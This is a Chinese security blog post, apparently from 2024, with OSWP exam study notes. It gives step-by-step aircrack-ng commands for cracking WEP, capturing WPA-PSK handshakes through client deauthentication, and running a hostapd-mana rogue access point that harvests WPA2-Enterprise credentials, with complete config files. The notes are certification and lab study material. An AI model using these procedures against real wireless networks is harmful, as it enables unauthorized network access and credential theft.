@@ -1,0 +1,630 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>OSWP 笔记 | CXAQHQ</title>
+<link rel="shortcut icon" href="https://blog.cxaqhq.cn/favicon.ico?v=1744037624894">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.cxaqhq.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="OSWP 笔记 | CXAQHQ - Atom Feed" href="https://blog.cxaqhq.cn/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="个人感受
+这篇文章我不会讲原理、讲理论、讲工具，这些知识我会放到另外一篇文章讲解，这里我会讲感受，讲可能遇到的问题，引导大家思考，只要能发现问题，就能解决问题。
+我是第二次才通过OSWP考试的，第一次卡在WPA2-MGT（企业网络），因此第..." />
+    <meta name="keywords" content="OSWP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.cxaqhq.cn">
+  <img class="avatar" src="https://blog.cxaqhq.cn/images/avatar.png?v=1744037624894" alt="">
+  </a>
+  <h1 class="site-title">
+    CXAQHQ
+  </h1>
+  <p class="site-description">
+    再努力一点！
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/badboycxcc" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/cxaqhq" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              OSWP 笔记
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-11-23
+              </span>
+              <span>
+                15 min read
+              </span>
+              
+                <a href="https://blog.cxaqhq.cn/tag/9uFNc-WtPs/" class="post-tag">
+                  # OSWP
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://blog.cxaqhq.cn/post-images/oswp-note.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="个人感受">个人感受</h2>
+<p>这篇文章我不会讲原理、讲理论、讲工具，这些知识我会放到另外一篇文章讲解，这里我会讲感受，讲可能遇到的问题，引导大家思考，只要能发现问题，就能解决问题。</p>
+<p>我是第二次才通过OSWP考试的，第一次卡在WPA2-MGT（企业网络），因此第二次考试前我的重点放在WPA2-MGT上了。</p>
+<p>第一次考的时候，WPA2-PSK还是很简单的，常规方法。WPA2-MGT已经伪造了恶意接入点，并且获取了域用户及密码，但是一直无法连接对应的WIFI，当时很紧张，推测是目标WIFI做了MAC地址过滤，然后尝试了伪造已知的客户端MAC地址，结果还是没有连接上，原因未知。</p>
+<p>第二次考之前的话特地恶补了WPA2-MGT的攻击方法，了解了每一步的背后原理。WPA2-PSK还是我的首选目标，还是很简单的，然后就针对WPA2-MGT开始了，这次准备很充分，没有遇到第一次考试那种情况，甚至也没有MAC地址过滤情况。不到一个小时我就完成了WPA2-PSK、WPA2-MTG的考试（OSWP考试规则：WEP、WPA2-PSK、WPA2-MGT三选二，其中WPA2-MGT是必选的），我想着来都来了，WEP也看看，然后难度就上来了。<br>
+WEP 目标网络情况如下：</p>
+<ul>
+<li>有一个客户端连接</li>
+<li>连接很不稳定<br>
+因此我选择碎片（分片）攻击，密码也解密出来了，连接目标网络的这个时候环境开始出问题了，当时我没有修改网卡MAC，直接连接一直无法连接上，因此我判断可能是MAC地址过滤，因此修改MAC地址，</li>
+</ul>
+<p>网卡处于玄学的状态，我还原了很多次WEP环境都没有解决，大概还原了十多次（这个时候我已经和考官沟通了，但是他没有及时回复）。距离考试结束1分钟的时候，终于连接上了网络，但是默认没有分配IP，你需要执行 sudo dhclient wlan0 -v来给你网卡分配IP，然后你curl 请求proof.txt 获取标志，最后刚完成分配IP工作，就差curl 获取proof.txt 内容就结束了，VPN断开了。</p>
+<p>其实要是当时环境有问题我早一点跟考官说明，时间是可以延长的，包括如果你在考试前的个人认证花费太长时间，考官也会延长你的考试时间（我第一次就是这样的）。</p>
+<h2 id="实践知识">实践知识</h2>
+<p>更新 Kali</p>
+<pre><code>sudo apt update
+sudo apt full-upgrade -y
+</code></pre>
+<p>安装对应框架程序</p>
+<pre><code>sudo apt install airmon-ng reaver hashcat hostapd dnsmasq nftables apache2 libapache2-mod-php freeradius
+</code></pre>
+<p>更新本地 Git 仓库</p>
+<pre><code>可以使用：
+git pull origin master
+
+或者：
+git pull origin main
+</code></pre>
+<p>报告生成</p>
+<pre><code>OSCP考试报告模板
+https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
+
+创建 Markdown 文件：
+ruby osert.rb init
+
+生成 PDF：
+ruby osert.rb generate
+
+</code></pre>
+<p>列出 USB 设备信息</p>
+<pre><code>sudo lsusb -vv
+lsusb
+sudo airmon-ng
+</code></pre>
+<p>恢复正常网络连接（重启网络）</p>
+<pre><code>sudo service networking restart
+sudo service NetworkManager restart
+或者
+service networking start
+service network-manager start
+</code></pre>
+<h2 id="路线图">路线图</h2>
+<p>连接VPN</p>
+<pre><code>openvpn 
+</code></pre>
+<p>连接到目标系统（通过 SSH）：</p>
+<pre><code>ssh &lt;username&gt;@&lt;target_ip&gt; -p&lt;port&gt; ## 使用提供的 SSH 信息连接到目标系统
+</code></pre>
+<p>扫描附近的无线网络：</p>
+<pre><code>iw dev wlan0 scan | grep SSID ## 检测在无线网卡（wlan0）范围内的无线网络
+</code></pre>
+<p>设置无线网卡为监视模式：</p>
+<pre><code>airmon-ng start wlan0 ## 将无线网卡（wlan0）设置为监视模式
+</code></pre>
+<p>监听周围的网络：</p>
+<pre><code>airodump-ng mon0 ## 通过监听网络（在监视模式下）检测周围的网络
+</code></pre>
+<p>更改无线网卡的频道：</p>
+<pre><code>iwconfig mon0 channel 3 ## 更改无线网卡所在的频道
+</code></pre>
+<p>查看无线网卡所在的频道：</p>
+<pre><code>iwlist mon0 channel ## 查看无线网卡所在的频道
+</code></pre>
+<p>监听目标 AP（访问点）：</p>
+<pre><code>airodump-ng -c 3 --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; mon0 ## 在指定频道上监听目标 AP（使用 BSSID）并将数据包保存到捕获文件
+</code></pre>
+<h2 id="wep">WEP</h2>
+<pre><code>&gt; WEP（有线等效隐私）攻击：
+
+  **认证方式：OPN（开放认证）** 或 **SKA（共享密钥认证）**？
+
+  &gt; **认证方式：OPN（开放认证）**
+
+    **是否有客户端连接到 AP（接入点）？**  
+    **YES（是）** 或 **NO（否）**？
+
+    &gt; **YES（是）**：
+
+      - ARP 请求重放攻击
+      - 交互式数据包重放攻击
+      - 去认证攻击（可以在两种情况下使用，即有或没有客户端连接）
+  
+    &gt; **NO（否）**：
+
+      - 伪造认证攻击（可以在两种情况下使用，即有或没有客户端连接）
+      - 分片攻击
+      - Korek ChopChop 攻击
+
+  &gt; **认证方式：SKA（共享密钥认证）**（绕过 WEP 共享密钥认证）：
+
+    **如果有客户端连接到 AP，可以按照以下步骤进行攻击：**
+
+     - 去认证攻击
+     - 伪造共享密钥认证攻击
+     - ARP 请求重放攻击
+     - 去认证攻击
+     - 使用 Aircrack-ng 破解 WEP 密钥
+</code></pre>
+<h3 id="arp重放攻击加速iv收集">ARP重放攻击（加速IV收集）</h3>
+<pre><code>步骤1：开始捕获数据包：
+
+airodump-ng --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;output file&gt; wlan0mon
+第 2 步：虚假身份验证（如果需要）：
+
+aireplay-ng -1 0 -a &lt;BSSID&gt; -h &lt;your MAC&gt; wlan0mon
+步骤3：ARP重放攻击（注入ARP数据包以增加IV收集）：
+
+aireplay-ng -3 -b &lt;BSSID&gt; -h &lt;your MAC&gt; wlan0mon
+您将看到指示 ARP 数据包正在重放的消息。此攻击会增加捕获的弱 IV 的数量。
+
+步骤 4：破解 WEP 密钥：
+
+aircrack-ng &lt;output file&gt;.cap
+</code></pre>
+<h3 id="碎片攻击">碎片攻击</h3>
+<pre><code>当没有可用的客户端时，碎片攻击很有用，您可以通过碎片数据包来破解 WEP 密钥。
+
+步骤1：开始捕获数据包：
+
+airodump-ng --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;output file&gt; wlan0mon
+第 2 步：虚假身份验证（如果需要）：
+
+aireplay-ng -1 0 -a &lt;BSSID&gt; -h &lt;your MAC&gt; wlan0mon
+步骤3：执行碎片攻击：
+
+aireplay-ng -5 -b &lt;BSSID&gt; -h &lt;your MAC&gt; wlan0mon
+目标是捕获数据包并将其分段，从而生成密钥流数据。
+
+步骤4：使用Packetforge-ng创建ARP数据包：
+
+一旦您有了可用的密钥流，就可以用来packetforge-ng创建伪造的 ARP 请求：
+packetforge-ng -0 -a &lt;AP MAC&gt; -h &lt;your MAC&gt; -k 255.255.255.255 -l 255.255.255.255 -y &lt;keystream file&gt; -w &lt;arp_packet&gt;
+步骤5：注入ARP数据包：
+
+aireplay-ng -2 -r &lt;arp_packet&gt; wlan0mon
+步骤6：破解WEP密钥：
+
+aircrack-ng &lt;output file&gt;.cap
+</code></pre>
+<h3 id="chop-chop-攻击">Chop-Chop 攻击</h3>
+<p>chop-chop 攻击可帮助您解密加密的 WEP 数据包的一个字节并获取密钥流。</p>
+<p>步骤1：开始捕获数据包：</p>
+<pre><code>airodump-ng --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;output file&gt; wlan0mon
+</code></pre>
+<p>第 2 步：执行 Chop-Chop 攻击：</p>
+<pre><code>aireplay-ng -4 -b &lt;BSSID&gt; -h &lt;your MAC&gt; wlan0mon
+</code></pre>
+<p>您将捕获可用于伪造 ARP 数据包或执行解密的数据包的一部分。</p>
+<p>步骤3：使用packetforge-ng创建ARP数据包：</p>
+<p>使用获取的密钥流创建 ARP 请求：</p>
+<pre><code>packetforge-ng -0 -a &lt;AP MAC&gt; -h &lt;your MAC&gt; -k 255.255.255.255 -l 255.255.255.255 -y &lt;keystream file&gt; -w &lt;arp_packet&gt;
+</code></pre>
+<p>步骤4：注入ARP数据包：</p>
+<pre><code>aireplay-ng -2 -r &lt;arp_packet&gt; wlan0mon
+</code></pre>
+<p>步骤 5：破解 WEP 密钥：</p>
+<pre><code>aircrack-ng &lt;output file&gt;.cap
+</code></pre>
+<h2 id="wpawpa2">WPA/WPA2</h2>
+<pre><code>&gt; WPA/WPA2
+
+  ## 攻击：
+
+    - 去认证攻击
+  
+  ## 破解网络密钥：
+
+    - 使用 Aircrack-ng
+    - 使用 JTR 和 Aircrack-ng
+    - 使用 coWPAtty
+    - 使用 Pyrit
+
+</code></pre>
+<h3 id="攻击wpawpa2psk">攻击WPA/WPA2（PSK）</h3>
+<p>1.捕获 WPA 握手：</p>
+<pre><code>airodump-ng --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;output file&gt; wlan0mon
+</code></pre>
+<p>2.取消对客户端的身份验证以强制重新进行身份验证：</p>
+<pre><code>aireplay-ng -0 5 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; wlan0mon
+</code></pre>
+<p>3.使用单词表破解 WPA/WPA2：推荐词汇表：rockyou.txt</p>
+<pre><code>aircrack-ng -w &lt;wordlist&gt; &lt;output file&gt;.cap
+</code></pre>
+<h3 id="wpa2wpa3-企业攻击手册1">WPA2/WPA3 企业攻击（手册1）</h3>
+<p>使用 (WPA2 Enterprise) 的恶意 AP 攻击hostapd-mana：</p>
+<p>安装hostapd-mana：</p>
+<pre><code>apt-get install hostapd-mana
+</code></pre>
+<p>配置hostapd-mana： 编辑配置文件 ( hostapd-mana.conf) 以模仿目标网络的 SSID 并设置恶意 AP 来捕获企业凭证。</p>
+<p>运行hostapd-mana：</p>
+<pre><code>hostapd-mana /path/to/hostapd-mana.conf
+</code></pre>
+<p>通过记录客户端进行身份验证的尝试来监控捕获的凭据。</p>
+<p>手动 EAP 网络钓鱼攻击使用hostapd-mana：</p>
+<p>修改hostapd-mana.conf以启用凭证网络钓鱼。</p>
+<p>设置eap_user_file并eap_server_cert拦截和捕获 PEAP/MSCHAPv2 凭证。</p>
+<p>启动恶意 AP 并捕获凭证：</p>
+<pre><code>hostapd-mana /path/to/hostapd-mana.conf
+</code></pre>
+<p>捕获的 PEAP/MSCHAPv2 凭证可以通过以下工具进行暴力破解john：</p>
+<pre><code>john --wordlist=&lt;wordlist&gt; captured_hashes.txt
+</code></pre>
+<h3 id="hostapd-manaconf-模板">hostapd-mana.conf 模板</h3>
+<pre><code># hostapd-mana 命令的模板配置文件：
+interface=wlan0
+ssid=apname
+channel=1
+ieee80211n=1
+hw_mode=g # 如果是 5GHz，设置为 a
+wpa=3 # 1 只启用 WPA，2 启用 WPA2
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=ANYPASSWORD # 实际值不重要，因为我们是为了捕获握手，必须在 8 到 63 个字符之间
+wpa_pairwise=TKIP CCMP # 仅适用于 WPA
+rsn_pairwise =TKIP CCMP # 仅适用于 WPA2，选项 3 启用两者
+mana_wpaout=/home/kali/name.hccapx # 指定保存握手的文件路径，每次握手都会追加到文件中，可以用 hashcat -m 2500 或 aircrack-ng 解密
+# 如果 mana_wpaout 报错：未知配置项 'mana_wpaout'，请确保使用的是 hostapd-mana 命令，而不是 hostapd 命令
+
+</code></pre>
+<h3 id="wpa2wpa3-企业攻击手册2">WPA2/WPA3 企业攻击（手册2）</h3>
+<pre><code>WPA2 企业版
+按照以下步骤设置无线监控并执行攻击。
+
+步骤 1：激活监控模式
+airmon-ng check kill &amp;&amp; airmon-ng start &lt;interface&gt;
+第 2 步：检查 AUTH 列
+airodump-ng &lt;interface&gt;
+注意：AUTH 列将显示 MGT。
+
+步骤 3：捕获握手
+sudo airodump-ng -c channel -w ESSID interface
+步骤 4：取消客户端身份验证以捕获握手
+aireplay-ng -0 0 -a ESSID -c client_ESSID interface
+步骤 5：使用 Wireshark 或 tshark 分析
+收集 BSSID、ESSID 和频道后：
+
+使用带有过滤器的 Wireshark 或 tshark：
+wlan.bssid==E8:9C:12:02:66:AA &amp;&amp; eap &amp;&amp; tls.handshake.certificate
+或者
+tls.handshake.type == 11,3
+步骤 6：使用 OpenSSL 保存证书
+在 TLSv1 记录层 &gt;&gt; 握手协议 &gt;&gt; 证书中查看数据包详情：
+
+openssl x509 -inform der -in cert.der -text
+攻击所需的详细信息包括：发行人信息。
+
+步骤 6.5（可选）：将证书转换为 PEM 格式
+openssl x509 -inform der -in cert.der -outform pem -out output.crt
+步骤 7：设置 FreeRADIUS 服务器
+安装方式：
+
+sudo apt install freeradius
+编辑ca.cnf和server.cnf文件以减少可疑的证书颁发机构字段。
+
+sudo mousepad /etc/freeradius/3.0/certs/ca.cnf
+sudo mousepad /etc/freeradius/3.0/certs/server.cnf
+使用正确的信息更新相应部分。
+
+步骤 8：准备证书
+导航到/etc/freeradius/3.0/certs/并运行：
+
+sudo rm dh &amp;&amp; make
+注意：如果 FreeRADIUS 需要其他配置，请忽略来自 FreeRADIUS 的错误。
+
+步骤 9：配置 hostapd-mana
+/etc/hostapd-mana/mana.conf使用正确的 SSID、证书路径和 EAP 文件进行编辑。
+
+步骤 10：设置mana.eap_user
+/etc/hostapd-mana/mana.eap_user使用所需的协议和身份验证方法进行配置。
+
+步骤11：启动hostapd-mana
+hostapd-mana /etc/hostapd-mana/mana.conf
+步骤 12：使用 asleap 查找用户
+使用正确的命令运行 asleap 来查找登录成功的用户。
+
+&lt;asleap command&gt; -W /usr/share/john/password.lst
+步骤13：创建wpa_supplicant.conf文件
+添加网络配置详细信息：
+
+network={
+  ssid=&quot;NetworkName&quot;
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  identity=&quot;Domain\\username&quot;
+  password=&quot;password&quot;
+  eap=PEAP
+  phase1=&quot;peaplabel=0&quot;
+  phase2=&quot;auth=MSCHAPV2&quot;
+}
+步骤 14：连接到网络
+用于wpa_supplicant连接：
+
+wpa_supplicant -c &lt;config file&gt;
+</code></pre>
+<h4 id="实际配置">实际配置</h4>
+<pre><code>ssid=xxxxxx
+interface=wlan0
+driver=nl80211
+
+channel=11
+hw_mode=g
+ieee8021x=1
+eap_server=1
+eapol_key_index_workaround=0
+
+eap_user_file=/home/kali/MGT/mana.eap_user
+
+ca_cert=/etc/freeradius/3.0/certs/ca.pem
+server_cert=/etc/freeradius/3.0/certs/server.pem
+private_key=/etc/freeradius/3.0/certs/server.key
+
+private_key_passwd=whatever
+
+dh_file=/etc/freeradius/3.0/certs/dh
+
+
+auth_algs=1
+wpa=3
+wpa_key_mgmt=WPA-EAP
+
+
+wpa_pairwise=CCMP TKIP
+mana_wpe=1
+mana_credout=/home/kali/MGT/hostapd.credoutfile
+mana_eapsuccess=1
+mana_eaptls=1
+</code></pre>
+<h4 id="实际连接配置">实际连接配置</h4>
+<pre><code>network={
+  ssid=&quot;xxxxxx&quot;
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  eap=PEAP
+  identity=&quot;xxxxxx\xxxxxx&quot;
+  password=&quot;xxxxxx&quot;
+  phase1=&quot;peaplabel=0&quot;
+  phase2=&quot;auth=MSCHAPV2&quot;
+}
+</code></pre>
+<h2 id="wpa_supplicant-连接指定网络">wpa_supplicant 连接指定网络</h2>
+<h3 id="wep-2">WEP</h3>
+<p>连接到 WEP 网络永久链接</p>
+<pre><code>network={
+  ssid=&quot;SSID&quot;
+  key_mgmt=NONE
+  wep_key0=&quot;&quot;
+  wep_tx_keyidx=0
+}
+</code></pre>
+<p>注意：WEP 中的密码（wep_key0）如果是十六进制则应为小写，&quot;&quot;<br>
+十六进制密码中大写字母也可以使用</p>
+<p>设置ssid为您要连接的网络名称。然后，将其保存wep.conf并使用以下命令进行连接：</p>
+<pre><code>sudo wpa_supplicant -i &lt;int&gt; -c &lt;file&gt;
+</code></pre>
+<p>然后打开另一个终端并向ip服务器发出请求DHCP：</p>
+<pre><code>sudo dhclient wlan0 -v
+</code></pre>
+<h3 id="wpa">WPA</h3>
+<p>配置文件</p>
+<pre><code>network={
+    ssid=&quot;SSID&quot;
+    psk=&quot;password&quot;
+    scan_ssid=1
+    key_mgmt=WPA-PSK
+    proto=WPA2
+}
+</code></pre>
+<p>将proto其设置为WPA(version)：</p>
+<p>WPA<br>
+WPA2<br>
+WPA3</p>
+<p>设置ssid为您要连接的网络名称。然后，将其保存wpa.conf并使用以下命令进行连接：</p>
+<pre><code>sudo wpa_supplicant -i &lt;int&gt; -c &lt;file&gt;
+</code></pre>
+<p>然后打开另一个终端并向ip服务器发出请求DHCP：</p>
+<pre><code>sudo dhclient wlan0 -v
+</code></pre>
+<h3 id="wpa-企业">WPA 企业</h3>
+<p>连接到 WPA Enterprise</p>
+<pre><code>network={
+  ssid=&quot;SSID&quot;
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  eap=PEAP
+  identity=&quot;identity\user&quot;
+  password=&quot;password&quot;
+  phase1=&quot;peaplabel=0&quot;
+  phase2=&quot;auth=MSCHAPV2&quot;
+}
+</code></pre>
+<p>设置identity为用户名和password密码。<br>
+设置ssid为您要连接的网络名称。然后，将其保存wpa_entp.conf并使用以下命令进行连接：</p>
+<pre><code>sudo wpa_supplicant -i &lt;int&gt; -c &lt;file&gt;
+</code></pre>
+<p>然后打开另一个终端并向ip服务器发出请求DHCP：</p>
+<pre><code>sudo dhclient wlan0 -v
+</code></pre>
+<h2 id="参考">参考</h2>
+<ul>
+<li>https://brandonrussell.io/OSWP-Notes/Introduction.html</li>
+<li>https://zeyadazima.com/notes/oswplaybook/</li>
+<li>https://wizardforcel.gitbooks.io/kali-linux-wireless-pentest/content/</li>
+<li>https://github.com/legitaxes/OSWP-Notes</li>
+</ul>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E4%B8%AA%E4%BA%BA%E6%84%9F%E5%8F%97">个人感受</a></li>
+<li><a href="#%E5%AE%9E%E8%B7%B5%E7%9F%A5%E8%AF%86">实践知识</a></li>
+<li><a href="#%E8%B7%AF%E7%BA%BF%E5%9B%BE">路线图</a></li>
+<li><a href="#wep">WEP</a>
+<ul>
+<li><a href="#arp%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E5%8A%A0%E9%80%9Fiv%E6%94%B6%E9%9B%86">ARP重放攻击（加速IV收集）</a></li>
+<li><a href="#%E7%A2%8E%E7%89%87%E6%94%BB%E5%87%BB">碎片攻击</a></li>
+<li><a href="#chop-chop-%E6%94%BB%E5%87%BB">Chop-Chop 攻击</a></li>
+</ul>
+</li>
+<li><a href="#wpawpa2">WPA/WPA2</a>
+<ul>
+<li><a href="#%E6%94%BB%E5%87%BBwpawpa2psk">攻击WPA/WPA2（PSK）</a></li>
+<li><a href="#wpa2wpa3-%E4%BC%81%E4%B8%9A%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C1">WPA2/WPA3 企业攻击（手册1）</a></li>
+<li><a href="#hostapd-manaconf-%E6%A8%A1%E6%9D%BF">hostapd-mana.conf 模板</a></li>
+<li><a href="#wpa2wpa3-%E4%BC%81%E4%B8%9A%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C2">WPA2/WPA3 企业攻击（手册2）</a>
+<ul>
+<li><a href="#%E5%AE%9E%E9%99%85%E9%85%8D%E7%BD%AE">实际配置</a></li>
+<li><a href="#%E5%AE%9E%E9%99%85%E8%BF%9E%E6%8E%A5%E9%85%8D%E7%BD%AE">实际连接配置</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#wpa_supplicant-%E8%BF%9E%E6%8E%A5%E6%8C%87%E5%AE%9A%E7%BD%91%E7%BB%9C">wpa_supplicant 连接指定网络</a>
+<ul>
+<li><a href="#wep-2">WEP</a></li>
+<li><a href="#wpa">WPA</a></li>
+<li><a href="#wpa-%E4%BC%81%E4%B8%9A">WPA 企业</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://blog.cxaqhq.cn/post/cobalt-strike-通讯协议分析/">
+              <h3 class="post-title">
+                Cobalt Strike 通讯协议分析
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Backdoor
+  <a class="rss" href="https://blog.cxaqhq.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
